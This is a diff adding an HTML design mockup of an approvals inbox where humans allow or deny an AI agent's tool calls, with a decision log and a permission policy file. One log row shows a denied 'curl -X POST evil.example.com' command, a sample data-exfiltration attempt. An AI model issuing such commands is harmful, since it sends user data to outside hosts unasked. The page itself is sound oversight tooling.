@@ -1,0 +1,438 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>leibniz · approvals</title>
+    <link rel="preconnect" href="https://rsms.me/" />
+    <link rel="stylesheet" href="https://rsms.me/inter/inter.css" />
+    <script src="https://cdn.tailwindcss.com?plugins=typography"></script>
+    <style>
+      :root { color-scheme: dark; }
+      html, body {
+        font-family: "Inter", ui-sans-serif, system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+        -webkit-font-smoothing: antialiased;
+      }
+      .num { font-variant-numeric: tabular-nums; }
+      .font-mono, code, pre, kbd {
+        font-family: ui-monospace, "JetBrains Mono", "SF Mono", Menlo, Consolas, monospace;
+      }
+      .dot-live { box-shadow: 0 0 8px rgba(52, 211, 153, 0.5); }
+      .dot-warn { box-shadow: 0 0 8px rgba(251, 191, 36, 0.5); }
+      .dot-err  { box-shadow: 0 0 8px rgba(251, 113, 133, 0.5); }
+      .pulse {
+        animation: pulse 2s ease-in-out infinite;
+      }
+      @keyframes pulse {
+        0%, 100% { opacity: 1; }
+        50% { opacity: 0.55; }
+      }
+      .scroll-thin::-webkit-scrollbar { width: 8px; }
+      .scroll-thin::-webkit-scrollbar-thumb {
+        background: rgba(82, 82, 91, 0.4);
+        border-radius: 4px;
+      }
+    </style>
+  </head>
+  <body class="bg-zinc-950 text-zinc-100 min-h-screen flex flex-col">
+    <!-- Header -->
+    <header class="border-b border-zinc-800 bg-zinc-900/60 sticky top-0 backdrop-blur z-20">
+      <div class="max-w-7xl mx-auto px-6 h-14 flex items-center gap-6">
+        <a href="index.html" class="font-mono text-lg font-semibold tracking-tight flex items-center gap-2">
+          <span class="text-emerald-400">L</span>
+          <span class="hidden sm:inline">leibniz</span>
+        </a>
+        <nav class="flex gap-5 text-sm">
+          <a href="dashboard.html" class="py-1.5 border-b-2 border-transparent text-zinc-400 hover:text-zinc-100 hover:border-zinc-700 transition-colors">Dashboard</a>
+          <a href="sessions.html" class="py-1.5 border-b-2 border-transparent text-zinc-400 hover:text-zinc-100 hover:border-zinc-700 transition-colors">Sessions</a>
+          <a href="approvals.html" class="py-1.5 border-b-2 border-emerald-400 text-zinc-100 transition-colors">Approvals</a>
+          <a href="memory.html" class="py-1.5 border-b-2 border-transparent text-zinc-400 hover:text-zinc-100 hover:border-zinc-700 transition-colors">Memory</a>
+          <a href="cost.html" class="py-1.5 border-b-2 border-transparent text-zinc-400 hover:text-zinc-100 hover:border-zinc-700 transition-colors">Cost</a>
+          <a href="settings.html" class="py-1.5 border-b-2 border-transparent text-zinc-400 hover:text-zinc-100 hover:border-zinc-700 transition-colors">Settings</a>
+        </nav>
+        <div class="ml-auto flex items-center gap-4 text-xs text-zinc-500">
+          <span class="hidden md:flex items-center gap-1.5">
+            <span class="inline-block w-1.5 h-1.5 rounded-full bg-amber-400 dot-warn pulse"></span>
+            <span class="num text-amber-300">3</span>
+            <span>pending</span>
+          </span>
+          <span class="flex items-center gap-1.5">
+            <span class="inline-block w-1.5 h-1.5 rounded-full bg-emerald-400 dot-live"></span>
+            <span class="font-mono">v0.2.0</span>
+          </span>
+        </div>
+      </div>
+    </header>
+
+    <main class="max-w-7xl mx-auto px-6 py-6 w-full flex-1">
+      <!-- Header -->
+      <section class="mb-2 flex items-baseline gap-4">
+        <h1 class="text-2xl font-semibold tracking-tight">Approvals</h1>
+        <span class="text-sm text-zinc-500 num">3 pending · 247 decided</span>
+        <span class="ml-auto text-xs text-zinc-500 font-mono">policy: ~/.leibniz/policy.yaml</span>
+      </section>
+      <p class="text-sm text-zinc-500 mb-6">
+        Live inbox for <span class="font-mono text-zinc-400">PreToolUse</span> hooks awaiting human review.
+        Sessions block until you decide.
+      </p>
+
+      <!-- KPI strip -->
+      <section class="grid grid-cols-2 md:grid-cols-4 gap-3 mb-8">
+        <div class="rounded-lg bg-zinc-900 border border-zinc-800 p-4">
+          <div class="text-xs uppercase tracking-wide text-zinc-500">Pending</div>
+          <div class="text-2xl font-semibold num mt-1 text-amber-300">3</div>
+          <div class="text-xs text-zinc-500 mt-1">oldest <span class="num text-zinc-300">14s</span> ago</div>
+        </div>
+        <div class="rounded-lg bg-zinc-900 border border-zinc-800 p-4">
+          <div class="text-xs uppercase tracking-wide text-zinc-500">Decided today</div>
+          <div class="text-2xl font-semibold num mt-1">42</div>
+          <div class="text-xs text-zinc-500 mt-1">
+            <span class="text-emerald-300 num">38</span> allow ·
+            <span class="text-rose-300 num">4</span> deny
+          </div>
+        </div>
+        <div class="rounded-lg bg-zinc-900 border border-zinc-800 p-4">
+          <div class="text-xs uppercase tracking-wide text-zinc-500">Auto-resolved</div>
+          <div class="text-2xl font-semibold num mt-1">198</div>
+          <div class="text-xs text-zinc-500 mt-1">via policy rules</div>
+        </div>
+        <div class="rounded-lg bg-zinc-900 border border-zinc-800 p-4">
+          <div class="text-xs uppercase tracking-wide text-zinc-500">Avg response</div>
+          <div class="text-2xl font-semibold num mt-1">8s</div>
+          <div class="text-xs text-zinc-500 mt-1">p95 <span class="num">42s</span></div>
+        </div>
+      </section>
+
+      <!-- Pending inbox -->
+      <section class="mb-8">
+        <div class="flex items-baseline justify-between mb-3">
+          <h2 class="text-sm uppercase tracking-wide text-zinc-400 flex items-center gap-2">
+            <span class="inline-block w-1.5 h-1.5 rounded-full bg-amber-400 dot-warn pulse"></span>
+            Pending
+          </h2>
+          <div class="flex items-center gap-3 text-xs text-zinc-500">
+            <button class="hover:text-zinc-200">deny all</button>
+            <span class="text-zinc-700">·</span>
+            <button class="hover:text-zinc-200">allow all (1×)</button>
+          </div>
+        </div>
+
+        <div class="space-y-3">
+          <!-- Pending request 1 — Bash -->
+          <div class="rounded-lg bg-zinc-900 border border-amber-500/30 ring-1 ring-amber-500/10 overflow-hidden">
+            <div class="px-4 py-2.5 border-b border-zinc-800/60 bg-zinc-950/40 flex items-center gap-3 text-xs">
+              <span class="inline-block w-1.5 h-1.5 rounded-full bg-amber-400 dot-warn"></span>
+              <span class="font-mono text-amber-300">PreToolUse</span>
+              <span class="font-mono text-zinc-500">·</span>
+              <span class="font-mono text-zinc-300">Bash</span>
+              <span class="text-zinc-500 ml-auto num">14s ago</span>
+              <a href="session-detail.html" class="font-mono text-zinc-500 hover:text-zinc-200">01HXKQ3F···</a>
+            </div>
+            <div class="px-4 py-3">
+              <div class="font-mono text-sm text-zinc-200 mb-1.5">
+                <span class="text-zinc-500">$</span>
+                rg --files -t py | xargs wc -l | sort -rn | head -20
+              </div>
+              <div class="text-xs text-zinc-500">
+                <span class="text-zinc-400">cwd:</span>
+                <span class="font-mono">~/code/leibniz-platform</span>
+                &nbsp;·&nbsp;
+                <span class="text-zinc-400">why ask:</span>
+                no rule matched <span class="font-mono text-zinc-400">Bash(rg…)</span> · default policy is ask
+              </div>
+              <details class="mt-2 text-xs text-zinc-500">
+                <summary class="cursor-pointer hover:text-zinc-300 font-mono">show full input ↓</summary>
+                <pre class="mt-2 p-3 rounded bg-zinc-950 border border-zinc-800/60 font-mono text-[11px] text-zinc-400 overflow-x-auto">{
+  "command": "rg --files -t py | xargs wc -l | sort -rn | head -20",
+  "description": "find the largest Python files",
+  "timeout_ms": 30000
+}</pre>
+              </details>
+            </div>
+            <div class="px-4 py-3 border-t border-zinc-800/60 bg-zinc-950/20 flex flex-wrap items-center gap-2">
+              <button class="px-3 py-1.5 rounded text-xs font-medium bg-emerald-500/15 border border-emerald-500/40 text-emerald-300 hover:bg-emerald-500/25 transition-colors">
+                allow once
+              </button>
+              <button class="px-3 py-1.5 rounded text-xs font-medium bg-zinc-900 border border-zinc-700 text-zinc-300 hover:border-emerald-500/40 hover:text-emerald-300 transition-colors">
+                allow this session
+              </button>
+              <button class="px-3 py-1.5 rounded text-xs font-medium bg-zinc-900 border border-zinc-700 text-zinc-300 hover:border-emerald-500/40 hover:text-emerald-300 transition-colors">
+                always allow <span class="font-mono text-zinc-500">Bash(rg ⋯)</span>
+              </button>
+              <span class="text-zinc-700 mx-1">·</span>
+              <button class="px-3 py-1.5 rounded text-xs font-medium bg-rose-500/10 border border-rose-500/30 text-rose-300 hover:bg-rose-500/20 transition-colors">
+                deny
+              </button>
+              <span class="ml-auto text-[11px] text-zinc-500 font-mono">⌥1 / ⌥2 / ⌥3 / ⌥d</span>
+            </div>
+          </div>
+
+          <!-- Pending request 2 — Edit -->
+          <div class="rounded-lg bg-zinc-900 border border-amber-500/30 ring-1 ring-amber-500/10 overflow-hidden">
+            <div class="px-4 py-2.5 border-b border-zinc-800/60 bg-zinc-950/40 flex items-center gap-3 text-xs">
+              <span class="inline-block w-1.5 h-1.5 rounded-full bg-amber-400 dot-warn"></span>
+              <span class="font-mono text-amber-300">PreToolUse</span>
+              <span class="font-mono text-zinc-500">·</span>
+              <span class="font-mono text-zinc-300">Edit</span>
+              <span class="text-zinc-500 ml-auto num">7s ago</span>
+              <a href="session-detail.html" class="font-mono text-zinc-500 hover:text-zinc-200">01HXKQ8M···</a>
+            </div>
+            <div class="px-4 py-3">
+              <div class="text-sm text-zinc-200 mb-1.5">
+                <span class="font-mono text-zinc-500">edit</span>
+                <span class="font-mono text-zinc-300">leibniz/store.py</span>
+                <span class="text-zinc-500 text-xs">— 1 replacement,</span>
+                <span class="text-emerald-300 text-xs num">+12</span>
+                <span class="text-rose-300 text-xs num">−3</span>
+              </div>
+              <div class="text-xs text-zinc-500">
+                <span class="text-zinc-400">cwd:</span>
+                <span class="font-mono">~/code/leibniz-platform</span>
+                &nbsp;·&nbsp;
+                <span class="text-zinc-400">why ask:</span>
+                rule matches <span class="font-mono text-amber-300">Edit(leibniz/⋯) → ask</span>
+              </div>
+              <details class="mt-2 text-xs text-zinc-500">
+                <summary class="cursor-pointer hover:text-zinc-300 font-mono">show diff ↓</summary>
+                <pre class="mt-2 p-3 rounded bg-zinc-950 border border-zinc-800/60 font-mono text-[11px] leading-relaxed overflow-x-auto">
+<span class="text-zinc-500">@@ -34,3 +34,12 @@</span>
+<span class="text-rose-300">- def list_sessions(self, limit: int = 50):</span>
+<span class="text-rose-300">-     return sorted(self._scan(), key=lambda s: s.last_modified, reverse=True)[:limit]</span>
+<span class="text-emerald-300">+ def list_sessions(self, limit: int = 50, project: str | None = None):</span>
+<span class="text-emerald-300">+     items = self._scan()</span>
+<span class="text-emerald-300">+     if project:</span>
+<span class="text-emerald-300">+         items = [s for s in items if s.cwd.endswith(project)]</span>
+<span class="text-emerald-300">+     return sorted(items, key=lambda s: s.last_modified, reverse=True)[:limit]</span>
+<span class="text-emerald-300">+ </span>
+<span class="text-emerald-300">+ def list_sessions_for_cwd(self, cwd: str):</span>
+<span class="text-emerald-300">+     return [s for s in self._scan() if s.cwd == cwd]</span></pre>
+              </details>
+            </div>
+            <div class="px-4 py-3 border-t border-zinc-800/60 bg-zinc-950/20 flex flex-wrap items-center gap-2">
+              <button class="px-3 py-1.5 rounded text-xs font-medium bg-emerald-500/15 border border-emerald-500/40 text-emerald-300 hover:bg-emerald-500/25 transition-colors">
+                allow once
+              </button>
+              <button class="px-3 py-1.5 rounded text-xs font-medium bg-zinc-900 border border-zinc-700 text-zinc-300 hover:border-emerald-500/40 hover:text-emerald-300 transition-colors">
+                allow this session
+              </button>
+              <button class="px-3 py-1.5 rounded text-xs font-medium bg-zinc-900 border border-zinc-700 text-zinc-300 hover:border-emerald-500/40 hover:text-emerald-300 transition-colors">
+                always allow <span class="font-mono text-zinc-500">Edit(leibniz/⋯)</span>
+              </button>
+              <span class="text-zinc-700 mx-1">·</span>
+              <button class="px-3 py-1.5 rounded text-xs font-medium bg-rose-500/10 border border-rose-500/30 text-rose-300 hover:bg-rose-500/20 transition-colors">
+                deny
+              </button>
+            </div>
+          </div>
+
+          <!-- Pending request 3 — WebFetch (riskier) -->
+          <div class="rounded-lg bg-zinc-900 border border-rose-500/30 ring-1 ring-rose-500/10 overflow-hidden">
+            <div class="px-4 py-2.5 border-b border-zinc-800/60 bg-zinc-950/40 flex items-center gap-3 text-xs">
+              <span class="inline-block w-1.5 h-1.5 rounded-full bg-rose-400 dot-err"></span>
+              <span class="font-mono text-rose-300">PreToolUse · sensitive</span>
+              <span class="font-mono text-zinc-500">·</span>
+              <span class="font-mono text-zinc-300">WebFetch</span>
+              <span class="text-zinc-500 ml-auto num">2s ago</span>
+              <a href="session-detail.html" class="font-mono text-zinc-500 hover:text-zinc-200">01HXKQA1···</a>
+            </div>
+            <div class="px-4 py-3">
+              <div class="text-sm text-zinc-200 mb-1.5">
+                <span class="font-mono text-zinc-500">fetch</span>
+                <span class="font-mono text-zinc-300">https://api.example-unknown.io/v1/users</span>
+              </div>
+              <div class="text-xs text-rose-300/90 leading-relaxed">
+                <span class="font-medium">⚠ unfamiliar host.</span>
+                Domain not on allow-list. Likely exfiltration risk if response is piped to a write
+                tool. Recommend deny unless you initiated this.
+              </div>
+              <div class="text-xs text-zinc-500 mt-1">
+                <span class="text-zinc-400">cwd:</span>
+                <span class="font-mono">~/code/leibniz-platform</span>
+                &nbsp;·&nbsp;
+                <span class="text-zinc-400">why ask:</span>
+                rule matches <span class="font-mono text-rose-300">WebFetch(*) → ask</span>
+              </div>
+            </div>
+            <div class="px-4 py-3 border-t border-zinc-800/60 bg-zinc-950/20 flex flex-wrap items-center gap-2">
+              <button class="px-3 py-1.5 rounded text-xs font-medium bg-emerald-500/15 border border-emerald-500/40 text-emerald-300 hover:bg-emerald-500/25 transition-colors">
+                allow once
+              </button>
+              <span class="text-zinc-700 mx-1">·</span>
+              <button class="px-3 py-1.5 rounded text-xs font-medium bg-rose-500/10 border border-rose-500/30 text-rose-300 hover:bg-rose-500/20 transition-colors">
+                deny
+              </button>
+              <button class="px-3 py-1.5 rounded text-xs font-medium bg-zinc-900 border border-zinc-700 text-zinc-300 hover:border-rose-500/40 hover:text-rose-300 transition-colors">
+                always deny <span class="font-mono text-zinc-500">WebFetch(*example-unknown.io)</span>
+              </button>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- Two-column layout for history + policy -->
+      <section class="grid lg:grid-cols-3 gap-6 mb-8">
+        <!-- Decision history -->
+        <div class="lg:col-span-2">
+          <div class="flex items-baseline justify-between mb-3">
+            <h2 class="text-sm uppercase tracking-wide text-zinc-400">Decision history</h2>
+            <span class="text-xs text-zinc-500 num">last 24h · 247 decisions</span>
+          </div>
+          <div class="rounded-lg bg-zinc-900 border border-zinc-800 overflow-hidden">
+            <table class="w-full text-sm">
+              <thead class="text-xs uppercase tracking-wide text-zinc-500 bg-zinc-950/40">
+                <tr>
+                  <th class="text-left font-medium px-4 py-2.5">Decision</th>
+                  <th class="text-left font-medium px-4 py-2.5">Tool</th>
+                  <th class="text-left font-medium px-4 py-2.5 hidden md:table-cell">Preview</th>
+                  <th class="text-right font-medium px-4 py-2.5">Source</th>
+                  <th class="text-right font-medium px-4 py-2.5">When</th>
+                </tr>
+              </thead>
+              <tbody class="divide-y divide-zinc-800/60 font-mono text-xs">
+                <tr class="hover:bg-zinc-900/60 transition-colors">
+                  <td class="px-4 py-2.5">
+                    <span class="inline-flex items-center gap-1.5 px-1.5 py-0.5 rounded text-[10px] bg-emerald-500/10 text-emerald-300 border border-emerald-500/20">allow</span>
+                  </td>
+                  <td class="px-4 py-2.5 text-zinc-300">Read</td>
+                  <td class="px-4 py-2.5 text-zinc-500 truncate max-w-md hidden md:table-cell">leibniz/app.py</td>
+                  <td class="px-4 py-2.5 text-right text-zinc-500">policy</td>
+                  <td class="px-4 py-2.5 text-right text-zinc-500 num">2s ago</td>
+                </tr>
+                <tr class="hover:bg-zinc-900/60 transition-colors">
+                  <td class="px-4 py-2.5">
+                    <span class="inline-flex items-center gap-1.5 px-1.5 py-0.5 rounded text-[10px] bg-emerald-500/10 text-emerald-300 border border-emerald-500/20">allow</span>
+                  </td>
+                  <td class="px-4 py-2.5 text-zinc-300">Bash</td>
+                  <td class="px-4 py-2.5 text-zinc-500 truncate max-w-md hidden md:table-cell">git status</td>
+                  <td class="px-4 py-2.5 text-right text-zinc-500">session</td>
+                  <td class="px-4 py-2.5 text-right text-zinc-500 num">8s ago</td>
+                </tr>
+                <tr class="hover:bg-zinc-900/60 transition-colors">
+                  <td class="px-4 py-2.5">
+                    <span class="inline-flex items-center gap-1.5 px-1.5 py-0.5 rounded text-[10px] bg-rose-500/10 text-rose-300 border border-rose-500/20">deny</span>
+                  </td>
+                  <td class="px-4 py-2.5 text-zinc-300">Bash</td>
+                  <td class="px-4 py-2.5 text-zinc-500 truncate max-w-md hidden md:table-cell">curl -X POST evil.example.com</td>
+                  <td class="px-4 py-2.5 text-right text-zinc-500">user</td>
+                  <td class="px-4 py-2.5 text-right text-zinc-500 num">31s ago</td>
+                </tr>
+                <tr class="hover:bg-zinc-900/60 transition-colors">
+                  <td class="px-4 py-2.5">
+                    <span class="inline-flex items-center gap-1.5 px-1.5 py-0.5 rounded text-[10px] bg-emerald-500/10 text-emerald-300 border border-emerald-500/20">allow</span>
+                  </td>
+                  <td class="px-4 py-2.5 text-zinc-300">Edit</td>
+                  <td class="px-4 py-2.5 text-zinc-500 truncate max-w-md hidden md:table-cell">leibniz/store.py (+5 −2)</td>
+                  <td class="px-4 py-2.5 text-right text-zinc-500">user</td>
+                  <td class="px-4 py-2.5 text-right text-zinc-500 num">1m ago</td>
+                </tr>
+                <tr class="hover:bg-zinc-900/60 transition-colors">
+                  <td class="px-4 py-2.5">
+                    <span class="inline-flex items-center gap-1.5 px-1.5 py-0.5 rounded text-[10px] bg-emerald-500/10 text-emerald-300 border border-emerald-500/20">allow</span>
+                  </td>
+                  <td class="px-4 py-2.5 text-zinc-300">Read</td>
+                  <td class="px-4 py-2.5 text-zinc-500 truncate max-w-md hidden md:table-cell">README.md</td>
+                  <td class="px-4 py-2.5 text-right text-zinc-500">policy</td>
+                  <td class="px-4 py-2.5 text-right text-zinc-500 num">2m ago</td>
+                </tr>
+                <tr class="hover:bg-zinc-900/60 transition-colors">
+                  <td class="px-4 py-2.5">
+                    <span class="inline-flex items-center gap-1.5 px-1.5 py-0.5 rounded text-[10px] bg-amber-500/10 text-amber-300 border border-amber-500/20">deny</span>
+                  </td>
+                  <td class="px-4 py-2.5 text-zinc-300">Write</td>
+                  <td class="px-4 py-2.5 text-zinc-500 truncate max-w-md hidden md:table-cell">~/.zshrc (auto-blocked: dotfile)</td>
+                  <td class="px-4 py-2.5 text-right text-zinc-500">policy</td>
+                  <td class="px-4 py-2.5 text-right text-zinc-500 num">4m ago</td>
+                </tr>
+                <tr class="hover:bg-zinc-900/60 transition-colors">
+                  <td class="px-4 py-2.5">
+                    <span class="inline-flex items-center gap-1.5 px-1.5 py-0.5 rounded text-[10px] bg-emerald-500/10 text-emerald-300 border border-emerald-500/20">allow</span>
+                  </td>
+                  <td class="px-4 py-2.5 text-zinc-300">Bash</td>
+                  <td class="px-4 py-2.5 text-zinc-500 truncate max-w-md hidden md:table-cell">uv run pytest tests/</td>
+                  <td class="px-4 py-2.5 text-right text-zinc-500">always</td>
+                  <td class="px-4 py-2.5 text-right text-zinc-500 num">5m ago</td>
+                </tr>
+              </tbody>
+            </table>
+            <div class="px-4 py-2.5 border-t border-zinc-800/60 text-xs text-zinc-500 flex items-center gap-3">
+              <span class="font-mono">~/.leibniz/audit.jsonl</span>
+              <span class="ml-auto">
+                <a href="#" class="hover:text-zinc-200">view full log →</a>
+              </span>
+            </div>
+          </div>
+        </div>
+
+        <!-- Policy editor -->
+        <div>
+          <div class="flex items-baseline justify-between mb-3">
+            <h2 class="text-sm uppercase tracking-wide text-zinc-400">Policy</h2>
+            <a href="settings.html" class="text-xs text-zinc-500 hover:text-zinc-200">edit →</a>
+          </div>
+          <div class="rounded-lg bg-zinc-900 border border-zinc-800 overflow-hidden">
+            <div class="px-4 py-2 text-[10px] uppercase tracking-wide text-zinc-500 border-b border-zinc-800/60 font-mono flex items-center gap-2">
+              <span>~/.leibniz/policy.yaml</span>
+              <span class="ml-auto text-emerald-400 normal-case">● synced</span>
+            </div>
+            <pre class="p-4 text-[11px] leading-relaxed overflow-x-auto font-mono"><span class="text-zinc-500"># last-match-wins, like pi-permission-system</span>
+<span class="text-zinc-300">rules</span>:
+  <span class="text-zinc-500"># auto-allow safe reads</span>
+  - match: <span class="text-emerald-300">Read(*)</span>
+    decide: <span class="text-emerald-300">allow</span>
+
+  - match: <span class="text-emerald-300">Bash(git status)</span>
+    decide: <span class="text-emerald-300">allow</span>
+  - match: <span class="text-emerald-300">Bash(git diff*)</span>
+    decide: <span class="text-emerald-300">allow</span>
+  - match: <span class="text-emerald-300">Bash(uv run pytest*)</span>
+    decide: <span class="text-emerald-300">allow</span>
+
+  <span class="text-zinc-500"># ask before edits in source tree</span>
+  - match: <span class="text-amber-300">Edit(leibniz/**)</span>
+    decide: <span class="text-amber-300">ask</span>
+
+  <span class="text-zinc-500"># always block dotfiles</span>
+  - match: <span class="text-rose-300">Write(.*)</span>
+    decide: <span class="text-rose-300">deny</span>
+  - match: <span class="text-rose-300">Write(~/.*)</span>
+    decide: <span class="text-rose-300">deny</span>
+
+  <span class="text-zinc-500"># network requires consent</span>
+  - match: <span class="text-amber-300">WebFetch(*)</span>
+    decide: <span class="text-amber-300">ask</span>
+
+  <span class="text-zinc-500"># default</span>
+  - match: <span class="text-amber-300">*</span>
+    decide: <span class="text-amber-300">ask</span></pre>
+            <div class="px-4 py-2.5 border-t border-zinc-800/60 text-xs text-zinc-500">
+              <span class="num text-zinc-300">8</span> rules · <span class="num text-zinc-300">198</span> auto-resolved today
+            </div>
+          </div>
+
+          <!-- Helper -->
+          <div class="mt-3 rounded-lg bg-zinc-900/40 border border-zinc-800/60 p-4 text-xs leading-relaxed text-zinc-400">
+            <div class="text-zinc-300 mb-1.5">How decisions land.</div>
+            <ol class="list-decimal list-inside space-y-1 marker:text-zinc-600">
+              <li>hook fires → <span class="font-mono">PreToolUse</span></li>
+              <li>match policy rules top-down (last match wins)</li>
+              <li>if ask → request enters this inbox</li>
+              <li>your click writes to <span class="font-mono">audit.jsonl</span></li>
+              <li>session resumes (or aborts on deny)</li>
+            </ol>
+          </div>
+        </div>
+      </section>
+    </main>
+
+    <footer class="mt-auto border-t border-zinc-800 bg-zinc-950">
+      <div class="max-w-7xl mx-auto px-6 py-4 flex flex-wrap items-center gap-x-6 gap-y-2 text-xs text-zinc-500 font-mono">
+        <span class="text-zinc-400">leibniz · v0.2-design</span>
+        <span class="hidden sm:inline">policy · ~/.leibniz/policy.yaml</span>
+        <span class="hidden md:inline">audit · ~/.leibniz/audit.jsonl</span>
+        <span class="ml-auto">
+          <a href="index.html" class="hover:text-zinc-200 transition-colors">← all mockups</a>
+        </span>
+      </div>
+    </footer>
+  </body>
+</html>
